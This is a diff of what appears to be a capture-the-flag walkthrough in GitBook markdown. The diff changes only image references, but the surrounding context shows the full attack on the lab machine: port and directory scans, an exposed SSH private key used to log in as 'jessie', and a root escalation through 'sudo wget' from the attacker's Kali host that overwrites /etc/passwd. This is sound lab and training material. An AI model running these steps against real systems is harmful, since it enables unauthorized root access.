@@ -15,7 +15,7 @@
 <pre><code><strong>nmap -A $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
@@ -30,7 +30,7 @@ No other ports found.
 
 On the main page of the site it was just a apache default page but in the source we can see someone named jessie making a comment.
 
-<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>
 
 Ran gobuster and found a site under sitemap, nothing really interesting about it when browsing.
 
@@ -40,7 +40,7 @@ Ran gobuster and found a site under sitemap, nothing really interesting about it
 gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
 ```
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
 gobuster wasn't really able to find anything interesting.
 
@@ -50,7 +50,7 @@ gobuster wasn't really able to find anything interesting.
 gobuster dir -u http://$VICTIM/sitemap/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
 ```
 
-<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>
 
 Ran dirb with defaults and it found a .ssh folder which has a id\_rsa so I downloaded and used it.
 
@@ -60,11 +60,11 @@ Ran dirb with defaults and it found a .ssh folder which has a id\_rsa so I downl
 dirb http://$VICTIM/sitemap/
 ```
 
-<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -73,7 +73,7 @@ chmod 600 id_rsa
 ssh -v -i id_rsa  jessie@$VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -81,7 +81,7 @@ ssh -v -i id_rsa  jessie@$VICTIM
 sudo -l
 ```
 
-<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
 I tried cracking jessies hash as I would then be able to run any command with sudo but I couldn't crack it, documenting it anyways.
 
@@ -128,7 +128,7 @@ jessie:$1$new$p7ptkEKU1HnaHpRtzNizS1:1000:1000:jessie,,,:/home/jessie:/bin/bash
 
 ```
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -143,5 +143,5 @@ sudo wget http://$KALI:8/passwd -O /etc/passwd
 sudo -i
 ```
 
-<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
